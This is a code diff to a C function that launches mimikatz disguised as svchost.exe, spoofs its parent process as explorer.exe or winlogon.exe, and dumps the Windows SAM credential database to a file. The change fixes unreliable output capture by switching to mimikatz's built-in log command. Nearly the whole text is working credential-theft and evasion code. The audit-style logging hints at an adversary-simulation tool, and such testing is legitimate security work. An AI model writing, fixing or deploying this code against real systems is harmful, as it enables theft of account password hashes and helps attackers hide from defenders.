@@ -84,7 +84,11 @@ static void launch_mimikatz(void) {
     char svchost[MAX_PATH], dump[MAX_PATH], cmd[MAX_PATH];
     wsprintfA(svchost, "%s\\svchost.exe", g_dir);
     wsprintfA(dump, "%s\\sam_dump.txt", g_dir);
-    wsprintfA(cmd, "\"%s\" \"lsadump::sam\" \"exit\"", svchost);
+    // ponytail: mimicatz output is NOT reliably captured via redirected stdout
+    // under CREATE_NO_WINDOW (it allocs its own console). Use its built-in
+    // `log` command to write the dump to a file directly.
+    DeleteFileA(dump);
+    wsprintfA(cmd, "\"%s\" \"log %s\" \"lsadump::sam\" \"exit\"", svchost, dump);
 
     DWORD pid = find_pid_by_name("explorer.exe");
     if (!pid) pid = find_pid_by_name("winlogon.exe");
@@ -109,12 +113,10 @@ static void launch_mimikatz(void) {
     }
     audit("[+] PPID attribute set");
 
-    HANDLE hOut = CreateFileA(dump, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     STARTUPINFOA si = { .cb = sizeof(si) };
-    if (hOut != INVALID_HANDLE_VALUE) { si.hStdOutput = hOut; si.hStdError = hOut; si.dwFlags = STARTF_USESTDHANDLES; }
     PROCESS_INFORMATION pi;
-    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM", pi.dwProcessId);
+    if (CreateProcessA(svchost, cmd, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, g_dir, &si, &pi)) {
+        audit("[+] svchost.exe (mimikatz) launched (PID: %lu) — dumping SAM -> %s", pi.dwProcessId, dump);
         CloseHandle(pi.hThread);
         WaitForSingleObject(pi.hProcess, INFINITE);
         CloseHandle(pi.hProcess);
@@ -122,7 +124,6 @@ static void launch_mimikatz(void) {
     } else {
         audit("[-] CreateProcess svchost.exe failed (%lu)", GetLastError());
     }
-    if (hOut != INVALID_HANDLE_VALUE) CloseHandle(hOut);
     DeleteProcThreadAttributeList(attrList);
     HeapFree(GetProcessHeap(), 0, attrList);
     CloseHandle(hParent);
